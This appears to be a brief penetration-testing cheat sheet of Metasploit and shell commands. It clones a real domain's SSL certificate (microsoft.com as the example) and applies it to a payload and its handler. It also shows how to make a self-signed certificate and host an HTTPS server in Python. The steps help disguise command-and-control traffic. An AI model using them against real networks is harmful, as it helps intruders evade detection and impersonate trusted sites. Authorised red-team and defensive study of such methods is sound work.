From the created files, utilize the .pem file as the ssl certificate in both the exploit/payload and the handler.

	msf > use auxiliary/gather/impersonate_ssl
	msf > set RHOST [domain]
	# example (msf > set RHOST www.microsoft.com)
	msf > run

## **Payload**

	msf > set handlersslcert [.pem file]
	msf > set stagerverifysslcert true
## **Handler**
	msf > set handlersslcert [.pem file]
	msf > set stagerverifysslcert true
	msf > set payload [payload]
	msf > exploit -j

## Create self-signed SSL certificate
	openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes

**Host webserver using the created certificate**

	python3 -c "import http.server, ssl;server_address=('[IP]',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"

